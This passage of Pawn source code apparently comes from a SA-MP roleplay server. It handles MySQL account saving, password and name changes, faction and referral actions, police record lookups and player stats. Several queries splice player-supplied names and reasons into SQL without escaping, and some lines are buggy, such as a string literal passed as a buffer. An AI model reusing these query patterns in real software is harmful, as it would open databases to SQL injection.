			szAdminName[MAX_PLAYER_NAME],
		    szQuery[2048];

		GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);

		mysql_escape_string(szPlayerName, szPlayerName2,MAX_PLAYER_NAME,sqldb);
		mysql_escape_string(PlayerInfo[playerid][pAdminName], szAdminName,MAX_PLAYER_NAME,sqldb);

		mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Password = '%s', Level = %d, AdminLevel = %d, AdminName = '%s', BanAppealer = %d, Donator = %d, Banned = %d, Permabanned = %d, Disabled = %d, LastIP = '%s', Registered = %d, \
		Tutorial = %i, Sex = %d, Age = %d, Skin = %d, PosX = '%f', PosY = '%f', PosZ = '%f', PosR = '%f', ConnectTime = %d, Respect = %d, PhoneNumber = %d, Warnings = %d, Gang = %d, Faction = %d, Leader = %d, Rankk = %d WHERE Username = '%s'",
		PlayerInfo[playerid][pKey], PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pAdmin], szAdminName, PlayerInfo[playerid][pBanAppealer], PlayerInfo[playerid][pVip], PlayerInfo[playerid][pBanned],
		PlayerInfo[playerid][pPermaBanned], PlayerInfo[playerid][pDisabled], PlayerInfo[playerid][pIP], PlayerInfo[playerid][pReg], PlayerInfo[playerid][pTut], PlayerInfo[playerid][pSex], PlayerInfo[playerid][pAge], PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pPos_x],
		PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z], PlayerInfo[playerid][pPos_r], PlayerInfo[playerid][pConnectTime], PlayerInfo[playerid][pRespect], PlayerInfo[playerid][pNumber], PlayerInfo[playerid][pWarns], PlayerInfo[playerid][pGang],
		PlayerInfo[playerid][pFaction], PlayerInfo[playerid][pLeader], PlayerInfo[playerid][pRank], szPlayerName);

		mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_SAVE_ACCOUNT_CHAIN_1,playerid);
	}
	return 1;
}

stock timec(timestamp, compare = -1) {
    if (compare == -1) {
        compare = gettime();
    }
    new
        n,
        // on the following line, I have removed the need for the diff() function.
        // if you want to use the diff() function in pawn, replace the following with:
        // Float:d = diff(timestamp, compare),
        Float:d = (timestamp > compare) ? timestamp - compare : compare - timestamp,
        returnstr[32];
    if (d < 60) {
        format(returnstr, sizeof(returnstr), "< 1 minute");
        return returnstr;
    } else if (d < 3600) { // 3600 = 1 hour
        n = floatround(floatdiv(d, 60.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "minute");
    } else if (d < 86400) { // 86400 = 1 day
        n = floatround(floatdiv(d, 3600.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "hour");
    } else if (d < 2592000) { // 2592000 = 1 month
        n = floatround(floatdiv(d, 86400.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "day");
    } else if (d < 31536000) { // 31536000 = 1 year
        n = floatround(floatdiv(d, 2592000.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "month");
    } else {
        n = floatround(floatdiv(d, 31536000.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "year");
    }
    if (n == 1) {
        format(returnstr, sizeof(returnstr), "1 %s", returnstr);
    } else {
        format(returnstr, sizeof(returnstr), "%d %ss", n, returnstr);
    }
    return returnstr;
}
// forward OnQueryError(errorid, const error[], const callback[], const query[], MySQL:handle);

public OnQueryError(errorid, const error[], const callback[], const query[], MySQL:handle) {
	printf("errorid: %d | error: %s | callback: %s | query: %s", errorid, error, callback, query);
	return 1;
}
forward OnQueryFinished(resultid,extraid);
public OnQueryFinished(resultid, extraid)
{
	new szQuery[2048];

	switch(resultid) {
	    case THREAD_CONFIRM_USERNAME:
		{
	        // // mysql_free_result(sqldb);

	        // if(mysql_fetch_int(sqldb) == 0) { // MySQL confirmed the COUNT(*) result is 0; no account with that username exists yet.
			if(cache_num_rows())
			{
				new count;
				cache_get_value_name_int(0,"COUNT(*)",count);

				if(count == 0)
				{
					// mysql_free_result(sqldb);
					ShowMainMenuDialog(extraid, 2);
		            gPlayerAccount[extraid] = 0;
				}
	         	else
				{
					// mysql_free_result(sqldb);
					ShowMainMenuDialog(extraid, 1);
					gPlayerAccount[extraid] = 1;
				}
		  	}
	    }
		
	    case THREAD_CHECK_NAME_PASSWORD:
		{
// // mysql_free_result(sqldb);

	        if(cache_num_rows()) {
	            new
	                szPassword[64],
	                szTarget[MAX_PLAYER_NAME],
					szBuffer[129];

				GetPVarString(extraid, "opasschange", szPassword, sizeof(szPassword));
				GetPVarString(extraid, "opasschangetarget", szTarget, sizeof(szTarget));

				WP_Hash(szBuffer, sizeof(szBuffer), szPassword);

		        mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Password = '%s' WHERE Username = '%s'", szBuffer, szTarget);
		        mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_FULLY_CHANGE_PASSWORD,extraid);
	        } else {
				DeletePVar(extraid, "opasschange");
				DeletePVar(extraid, "opasschangetarget");
				SendClientMessage(extraid, COLOR_GREY, "The player account name specified doesn't exist or currently has admin.");
			}

	        // // mysql_free_result(sqldb);
	    }
		case THREAD_LIST_NAMECHANGES: {
		    // mysql_free_result(sqldb);
/*
		    if(cache_num_rows()) {
		        // Use 'szQuery' because of the large size of the string at our disposal
		        mysql_format(sqldb,szQuery, sizeof(szQuery), "");

		        new
		            szPlayerName[MAX_PLAYER_NAME],
		            szPlayerOldName[MAX_PLAYER_NAME],
		            szPlayerAdminName[MAX_PLAYER_NAME],
					szMessage[1000],
					iUnixTS;

		        format(szMessage, sizeof(szMessage), "Listing the last 10 namechanges for %s:\n", GetPlayerNameEx(GetPVarInt(extraid, "namechanges_target")));

	        	while(mysql_fetch_row_format(szQuery, "|",sqldb)) {
					sscanf(szQuery, "p<|>s[MAX_PLAYER_NAME]ds[MAX_PLAYER_NAME]s[MAX_PLAYER_NAME]", szPlayerOldName, iUnixTS, szPlayerName, szPlayerAdminName);

					format(szMessage, sizeof(szMessage), "%s\n%s is now known as %s (as of %s) and his namechange was approved of by %s", szMessage, szPlayerOldName, szPlayerName, timec(iUnixTS), szPlayerAdminName);
				}

				DeletePVar(extraid, "namechanges_target");

				ShowPlayerDialogEx(extraid, DIALOG_SHOW_NAMECHANGES, DIALOG_STYLE_MSGBOX, "List of namechanges", szMessage, "OK", "");
		    } else {
				SendClientMessage(extraid, COLOR_GREY, "There are no namechanges registered for this player.");
				DeletePVar(extraid, "namechanges_target");
		    }

		    // // mysql_free_result(sqldb);*/
		}
	    case THREAD_FULLY_CHANGE_PASSWORD: {
	        new
	            szMessage[128],
				szTarget[MAX_PLAYER_NAME];

            GetPVarString(extraid, "opasschangetarget", szTarget, sizeof(szTarget));

     		format(szMessage, sizeof(szMessage), "You have changed %s's password.", szTarget);
	        SendClientMessage(extraid, COLOR_YELLOW, szMessage);

	        format(szMessage, sizeof(szMessage), "AdmCmd: %s's password was changed by %s", szTarget, GetPlayerNameEx(extraid));
	        Log("logs/password.log", szMessage);
	        ABroadCast(COLOR_LIGHTRED, szMessage, 1);

	        DeletePVar(extraid, "opasschange");
	        DeletePVar(extraid, "opasschangetarget");
		}
	    case THREAD_CHECK_NEW_NAME: {
			// mysql_free_result(sqldb);

			if(cache_num_rows()) {
			    SendClientMessage(GetPVarInt(extraid, "requestby"), COLOR_GREY, "The requested name is already taken.");
			    if(GetPVarInt(extraid, "requestpath") == 1) {
					SendClientMessage(extraid, COLOR_GREY, "The name you requested has already been taken, please select another.");
					ShowPlayerDialogEx(extraid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
				} else if(GetPVarInt(extraid, "requestpath") == 2) {
				    SendClientMessage(extraid, COLOR_GREY, "The name you requested has already been taken. Try again?");

					DeletePVar(extraid, "requestpath");
					DeletePVar(extraid, "NewNameRequest");
					DeletePVar(extraid, "NameChangeCost");
					DeletePVar(extraid, "requestby");
					DeletePVar(extraid, "requestedname");
					DeletePVar(extraid, "RequestingNameChange");
				} else if(GetPVarInt(extraid, "requestpath") == 3) {
					SendClientMessage(GetPVarInt(extraid, "requestby"), COLOR_GREY, "That name is already taken.");
					DeletePVar(extraid, "requestedname");
					DeletePVar(extraid, "requestpath");
					DeletePVar(extraid, "requestby");
				}
			} else {
			    new
			        szPlayerName[MAX_PLAYER_NAME];

				GetPVarString(extraid, "requestedname", szPlayerName, MAX_PLAYER_NAME);

				mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Username = '%s' WHERE ID = %d", szPlayerName, PlayerInfo[extraid][pID]);
				mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_CONFIRMED_NAMECHANGE,extraid);
			}

			// // mysql_free_result(sqldb);
		}
		case THREAD_CONFIRMED_NAMECHANGE: {
  			new
				szPlayerName[MAX_PLAYER_NAME],
				szOriginalPlayerName[MAX_PLAYER_NAME],
				string[128];

			GetPVarString(extraid, "requestedname", szPlayerName, MAX_PLAYER_NAME);
			GetPlayerName(extraid, "szOriginalPlayerName", MAX_PLAYER_NAME);

            if(GetPVarInt(extraid, "requestpath") == 1) {
				format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has approved %s's request to become %s", GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
				ABroadCast(COLOR_YELLOW, string, 2);
				format(PlayerInfo[extraid][pFlag], 128, "");
			} else if(GetPVarInt(extraid, "requestpath") == 2) {
				format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has approved %s's request to become %s", GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
				ABroadCast(COLOR_YELLOW, string, 2);
			} else {
				format(string, sizeof(string), "%s has set %s's name to %s.",GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
				ABroadCast(COLOR_YELLOW, string, 1);
			}

			if(PlayerInfo[extraid][pHouse] != INVALID_HOUSE_ID && strcmp(szOriginalPlayerName, HouseInfo[PlayerInfo[extraid][pHouse]][hOwner], true) == 0) {
				strmid(HouseInfo[PlayerInfo[extraid][pHouse]][hOwner], szPlayerName, 0, strlen(szPlayerName), 255);
     			format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[extraid][pHouse]][hOwner],HouseInfo[PlayerInfo[extraid][pHouse]][hLevel],PlayerInfo[extraid][pHouse]);
         		UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[extraid][pHouse]][hTextID], COLOR_HOUSEGREEN, string);
			}

			if(PlayerInfo[extraid][pHouse2] != INVALID_HOUSE_ID && strcmp(szOriginalPlayerName, HouseInfo[PlayerInfo[extraid][pHouse2]][hOwner], true) == 0) {
				strmid(HouseInfo[PlayerInfo[extraid][pHouse2]][hOwner], szPlayerName, 0, strlen(szPlayerName), 255);
    			format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[extraid][pHouse]][hOwner],HouseInfo[PlayerInfo[extraid][pHouse]][hLevel],PlayerInfo[extraid][pHouse]);
     			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[extraid][pHouse2]][hTextID], COLOR_HOUSEGREEN, string);
			}

			if(PlayerInfo[extraid][pVip] >= 1) {
				format(string, sizeof(string), "[DONATOR NAMECHANGES] %s has changed their name to %s.", GetPlayerNameEx(extraid), szPlayerName);
				Log("logs/donatornames.log", string);
			}

			format(string, sizeof(string), " Your name has been changed from %s to %s.", GetPlayerNameEx(extraid), szPlayerName);
			SendClientMessage(extraid, COLOR_YELLOW, string);

			format(string, sizeof(string), "%s changed \"%s\"s name to \"%s\"",GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
			Log("logs/stats.log", string);

			if(AdminDuty[extraid] == 0) {
				mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO namechanges (dbid, oldname, newname, approvedbyid, approvedbyname, unixts) VALUES(%d, '%s', '%s', %d, '%s', %d)", PlayerInfo[extraid][pID], GetPlayerNameEx(extraid), szPlayerName, PlayerInfo[GetPVarInt(extraid, "requestby")][pID], GetPlayerNameEx(GetPVarInt(extraid, "requestby")), gettime());
				mysql_tquery(sqldb,szQuery);
			}

			SetPlayerName(extraid, szPlayerName);

			if(GetPVarInt(extraid, "NameChangeCost") > 0)
				PlayerInfo[extraid][pCash] -= GetPVarInt(extraid, "NameChangeCost");

			PlayerInfo[extraid][pInt] = GetPlayerInterior(extraid);

			if(GetPVarType(extraid, "tabbedVW") != 0) {
				PlayerInfo[extraid][pVW] = GetPVarInt(extraid, "tabbedVW");
			} else PlayerInfo[extraid][pVW] = GetPlayerVirtualWorld(extraid);

			GetPlayerIp(extraid, PlayerInfo[extraid][pIP], 32);
			GetPlayerPos(extraid, PlayerInfo[extraid][pPos_x], PlayerInfo[extraid][pPos_y], PlayerInfo[extraid][pPos_z]);
			GetPlayerFacingAngle(extraid, PlayerInfo[extraid][pPos_r]);
			SaveAccount(extraid);

			DeletePVar(extraid, "requestby");
			DeletePVar(extraid, "requestedname");
			DeletePVar(extraid, "requestpath");
			DeletePVar(extraid, "NewNameRequest");
			DeletePVar(extraid, "NameChangeCost");
			DeletePVar(extraid, "RequestingNameChange");
		}
	    case THREAD_GIVE_REF_TOKENS: {
// // mysql_free_result(sqldb);

	        if(cache_num_rows() == 0)
	            return SendClientMessage(extraid, COLOR_YELLOW, "The player who referred you here no longer has an account and has not been given their referral token.");

			new iTokens;
			cache_get_value_name_int(0,"RefTokensOffline",iTokens);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET RefTokensOffline = %d WHERE Username = '%s'", iTokens, PlayerInfo[extraid][pReferredBy]);
			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_LITERALLY_GIVE_REFTOKEN,extraid);

            // // mysql_free_result(sqldb);
		}
		case THREAD_OFFLINE_FLAG: {
// // mysql_free_result(sqldb);

	        if(cache_num_rows() == 0)
	            return SendClientMessage(extraid, COLOR_GREY, "That account doesn't exist!");

			new
			    szFlag[128],
			    szFormattedFlag[128],
			    szPlayerName[MAX_PLAYER_NAME];

			GetPVarString(extraid, "offline_flag", szFlag, sizeof(szFlag));
			GetPVarString(extraid, "offline_flag_target", szPlayerName, sizeof(szPlayerName));

			new month,day,year;
			getdate(year,month,day);
			format(szFormattedFlag, sizeof(szFormattedFlag), "%s - %s (%d/%d/%d)", szFlag, GetPlayerNameEx(extraid), day, month, year);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Flag = '%s' WHERE Username = '%s'", szFormattedFlag, szPlayerName);
			mysql_tquery(sqldb,szQuery);

			// Avoid defining a new string, use one that's already clear to go.
			format(szFormattedFlag, sizeof(szFormattedFlag), "AdmCmd: %s has flagged %s, reason: %s.", GetPlayerNameEx(extraid), szPlayerName, szFlag);
			ABroadCast(COLOR_LIGHTRED, szFormattedFlag, 1);

			DeletePVar(extraid, "offline_flag");
			DeletePVar(extraid, "offline_flag_target");

    		// // mysql_free_result(sqldb);
		}
		case THREAD_OFFLINE_UNINVITE: {
		    // mysql_free_result(sqldb);

	        if(cache_num_rows() == 0)
	            return SendClientMessage(extraid, COLOR_YELLOW, "That account doesn't exist!");

			if(cache_num_rows()) {
			    new
			        szReturn[6];

            	cache_get_value_name(0,"AdminLevel",szReturn);

            	if(strval(szReturn) >= 5)
            	    return SendClientMessage(extraid, COLOR_YELLOW, "This player can't be uninvited by you. ");

                // mysql_fetch_field_row(szReturn, "Faction",sqldb);
				cache_get_value_name(0,"Faction",szReturn);
                if(strval(szReturn) != PlayerInfo[extraid][pFaction])
                	return SendClientMessage(extraid, COLOR_YELLOW, "This player isn't in the same faction as you.");

				new
				    szPlayerName[MAX_PLAYER_NAME];

				GetPVarString(extraid, "uninvite_target", szPlayerName, MAX_PLAYER_NAME);
				mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Faction = 0, Rankk = 0, OnDuty = 0, Leader = 0, Skin = 299 WHERE Username = '%s'", szPlayerName);
				mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_FULLY_UNINVITE,extraid);

				// mysql_free_result(sqldb);
            }

		}
		case THREAD_FULLY_UNINVITE: {
			new
			    szPlayerName[MAX_PLAYER_NAME],
			    szMessage[128];

			GetPVarString(extraid, "uninvite_target", szPlayerName, MAX_PLAYER_NAME);

			format(szMessage, sizeof(szMessage), "You have kicked %s from the faction.", szPlayerName);
			SendClientMessage(extraid, COLOR_LIGHTBLUE, szMessage);

            format(szMessage, sizeof(szMessage), "%s has uninvited %s from the %s.", GetPlayerNameEx(extraid), szPlayerName, GetFactionName(PlayerInfo[extraid][pFaction]));
			Log("logs/faction.log", szMessage);

			DeletePVar(extraid, "uninvite_target");
		}
		case THREAD_LITERALLY_GIVE_REFTOKEN: {
		    new
		        string[123];

			format(string, sizeof(string), "Since you have reached 8 playing hours and were referred by %s, they have gained 1 referral token.", PlayerInfo[extraid][pReferredBy]);
   			SendClientMessage(extraid, COLOR_YELLOW, string);
		}
	    case THREAD_REFERRAL_MENU: {
// // mysql_free_result(sqldb);

	        if(cache_num_rows() == 0) {
	            format(PlayerInfo[extraid][pReferredBy], MAX_PLAYER_NAME, "");
                ShowPlayerDialogEx(extraid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: There is no player registered by that name.\n\nWhat is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
	        } else {
	            // mysql_free_result(sqldb);

				new
				    string[128];

	            format(string, sizeof(string), "{FFFFFF}Are you sure you were referred by %s?", PlayerInfo[extraid][pReferredBy]);
	            ShowPlayerDialogEx(extraid, REGISTRATION_MENU_FIVE, DIALOG_STYLE_MSGBOX, "{FFA500}Next Generation Roleplay - Registration", string, "Yes", "No");
	        }
		}
		case THREAD_MDC_CHECK: {
			if(cache_num_rows() == 0) { // No rows exist with the specified criteria, so, wrong password!
				// mysql_free_result(sqldb);
				ShowPlayerDialogEx(extraid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | ERROR ", "There is no record of that person.", "OK", "Cancel");
			} else {
				// mysql_free_result(sqldb);
				new
					crimeDescription[128],
					crimeIssuerName[MAX_PLAYER_NAME],
					crimeIssuedToName[MAX_PLAYER_NAME],
					szFullMessage[1028];
					// iSlot = 0;

				// while(mysql_retrieve_row()) {
				for(new c; c < cache_num_rows(); c++){
					// iSlot++;
					cache_get_value_name(c,"crimeDescription",crimeDescription);
					cache_get_value_name(c,"crimeIssuerName",crimeIssuerName);
					cache_get_value_name(c,"crimeIssuedToName",crimeIssuedToName);
					if(!isnull(crimeDescription)) {
						format(szFullMessage, sizeof(szFullMessage), "Name: %s", crimeIssuedToName);
						format(szFullMessage, sizeof(szFullMessage), "%s\n %s - %s", szFullMessage, crimeDescription, crimeIssuerName);
					}
				
					// 	case 2, 3, 4, 5, 6: {
					// 		cache_get_value_name(crimeDescription, "crimeDescription",sqldb);
					// 		cache_get_value_name(crimeIssuerName, "crimeIssuerName",sqldb);
					// 		if(!isnull(szFullMessage) && !isnull(crimeDescription)) {
					// 			format(szFullMessage, sizeof(szFullMessage), "%s\n %s - %s", szFullMessage, crimeDescription, crimeIssuerName);
					// 		}
					// 	}
					// }
				}
				for(new i=0; i < MAX_PLAYERVEHICLES; i++) {
					if(PlayerVehicleInfo[GetPVarInt(extraid, "MDCCHECK")][i][pvTicket] != 0)
					{
						format(szFullMessage, sizeof(szFullMessage), "%s\n Vehicle registration: %d | Vehicle Name: %s | Ticket: $%d.\n",szFullMessage, PlayerVehicleInfo[GetPVarInt(extraid, "MDCCHECK")][i][pvId],GetVehicleName(PlayerVehicleInfo[GetPVarInt(extraid, "MDCCHECK")][i][pvId]),PlayerVehicleInfo[GetPVarInt(extraid, "MDCCHECK")][i][pvTicket]);
					}
				}
				ShowPlayerDialogEx(extraid, MDC_END_ID, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Criminal History", szFullMessage, "OK", "Cancel");
				DeletePVar(extraid, "MDCCHECK");
				// mysql_free_result(sqldb);
			}
		}
	    case THREAD_OFFLINE_KILLS: {
			// mysql_free_result(sqldb);
			if(IsPlayerConnected(extraid)) {
				if(cache_num_rows() == 0) { // No rows exist with the specified criteria, so, wrong password!
		            // mysql_free_result(sqldb);
					SendClientMessage(extraid, COLOR_GREY, "The specified player account doesn't exist.");
		        } else {
					// mysql_retrieve_row();

					new
					    szPlayerName[MAX_PLAYER_NAME],
						szReturn[128],
						iPlayerID;

                    cache_get_value_name(0, "Username",szPlayerName);
					cache_get_value_name(0, "ID",szReturn);
				    iPlayerID = strval(szReturn);
					// mysql_free_result(sqldb);

					SendClientMessage(extraid, COLOR_GREEN, "________________________________________________");
					format(szReturn, sizeof(szReturn), "<< Last 10 Kills of %s >>", szPlayerName);
					SendClientMessage(extraid, COLOR_YELLOW, szReturn);

					mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT kills.* FROM kills INNER JOIN players ON kills.killerID = players.ID OR kills.killedID = players.ID WHERE players.ID = '%d' ORDER BY kills.killTS ASC LIMIT 10", iPlayerID);
					mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_OFFLINE_KILLS_2, extraid);
				}
			}
	    }
	    case THREAD_OFFLINE_KILLS_2: {
			// mysql_free_result(sqldb);
			new
				KillLog[128];
				// iSlot = 0;

			for(new c=0; c < cache_num_rows(); c++)
			{
				cache_get_value_name(c, "killText",KillLog);
				if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);	
			}
			// mysql_free_result(sqldb);
		}
	    case THREAD_GET_STATS: {
// // mysql_free_result(sqldb);
			if(IsPlayerConnected(extraid)) {
			    new
			        szReturn[128];

		        if(cache_num_rows() == 0) { // No rows exist with the specified criteria, so, wrong password!
		            // mysql_free_result(sqldb);
					SendClientMessage(extraid, COLOR_GREY, "The specified player account doesn't exist.");
		        } else {
		            // mysql_retrieve_row();

					new facgang[20], employer[64], rank[64], division[64], jtext[20], jtext2[20];

					cache_get_value_name(0, "Level",szReturn);
				    new level = strval(szReturn);

				    cache_get_value_name(0, "ConnectTime",szReturn);
				    new phours = strval(szReturn);

				    cache_get_value_name(0, "Respect",szReturn);
					new respect = strval(szReturn);

					new nxtlevel = level + 1;
					new expamount = nxtlevel*levelexp;
					new costlevel = nxtlevel*2500;

					cache_get_value_name(0, "PhoneNumber",szReturn);
					new pnumber = strval(szReturn);

					cache_get_value_name(0, "Warnings",szReturn);
					new warns = strval(szReturn);

					facgang = "Faction";
					employer = "None";
					rank = "None";

					cache_get_value_name(0, "Gang",szReturn);
					new iGang = strval(szReturn);

					cache_get_value_name(0, "Rankk",szReturn);
					new iRank = strval(szReturn);

					cache_get_value_name(0, "Division",szReturn);
					new iDivision = strval(szReturn);

					cache_get_value_name(0, "Faction",szReturn);
					new iFaction = strval(szReturn);

					if(iGang < 255) {
					    facgang = "Family";
						division = "None";

						format(employer, sizeof(employer), "%s", FamilyInfo[iGang][FamilyName]);
						switch(iRank) {
							case 1: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank1]);
							case 2: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank2]);
							case 3: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank3]);
							case 4: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank4]);
							case 5: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank5]);
				  			case 6: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank6]);
							default: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank1]);
						}
					}
					else {
					    PlayerInfo[MAX_PLAYERS][pDivision] = iDivision;
					    PlayerInfo[MAX_PLAYERS][pRank] = iRank;
					    PlayerInfo[MAX_PLAYERS][pFaction] = iFaction;

			            GetPlayerFactionInfo(MAX_PLAYERS, rank, division, employer);
					}

					cache_get_value_name(0, "Job",szReturn);
					new iJob = strval(szReturn);

					cache_get_value_name(0, "Job2",szReturn);
					new iJob2 = strval(szReturn);

					switch(iJob)
					{
						case 1: jtext = "Detective";
						case 2: jtext = "Lawyer";
						case 3: jtext = "Whore";
						case 4: jtext = "Drugs Dealer";
						case 5: jtext = "Car Jacker";
						//case 6: jtext = "News Reporter";
						case 7: jtext = "Car Mechanic";
						case 8: jtext = "Bodyguard";
						case 9: jtext = "Arms Dealer";
						//case 10: jtext = "Car Dealer";
						case 12: jtext = "Boxer";
						case 14: jtext = "Drug Smuggler";
						//case 15: jtext = "Paper Boy";
						//case 16: jtext = "Trucker";
						case 17: jtext = "Taxi Driver";
						case 18: jtext = "Craftsman";
						case 19: jtext = "Bartender";
						case 20: jtext = "Trucker";
						case 21: jtext = "Pizza Boy";
						default: jtext = "None";
					}
					switch(iJob2)
					{
						case 1: jtext2 = "Detective";
						case 2: jtext2 = "Lawyer";
						case 3: jtext2 = "Whore";
						case 4: jtext2 = "Drugs Dealer";
						case 5: jtext2 = "Car Jacker";
						//case 6: jtext2 = "News Reporter";
						case 7: jtext2 = "Car Mechanic";
						case 8: jtext2 = "Bodyguard";
						case 9: jtext2 = "Arms Dealer";
						//case 10: jtext2 = "Car Dealer";
						case 12: jtext2 = "Boxer";
						case 14: jtext2 = "Drug Smuggler";
						//case 15: jtext2 = "Paper Boy";
						//case 16: jtext2 = "Trucker";
						case 17: jtext2 = "Taxi Driver";
						case 18: jtext2 = "Craftsman";
						case 19: jtext2 = "Bartender";
						case 20: jtext2 = "Trucker";
						case 21: jtext2 = "Pizza Boy";
						default: jtext2 = "None";
					}

					new jlevel;
					switch(iJob)
					{
						case 1:
						{
								cache_get_value_name(0, "DetSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 2:
						{
								cache_get_value_name(0, "LawSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 3:
						{
								cache_get_value_name(0, "SexSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 4:
						{
								cache_get_value_name(0, "DrugsSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 5:
						{
								cache_get_value_name(0, "CarSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
				  		case 7:
						{
								cache_get_value_name(0, "MechSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 9:
						{
								cache_get_value_name(0, "ArmsSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel < 50) { jlevel = 1; }
								else if(skilllevel >= 50 && skilllevel < 100) { jlevel = 2; }
								else if(skilllevel >= 100 && skilllevel < 200) { jlevel = 3; }
								else if(skilllevel >= 200 && skilllevel < 400) { jlevel = 4; }
								else if(skilllevel >= 400) { jlevel = 5; }
						}
						case 12:
						{
								cache_get_value_name(0, "BoxSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 14:
						{
								cache_get_value_name(0, "SmugSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
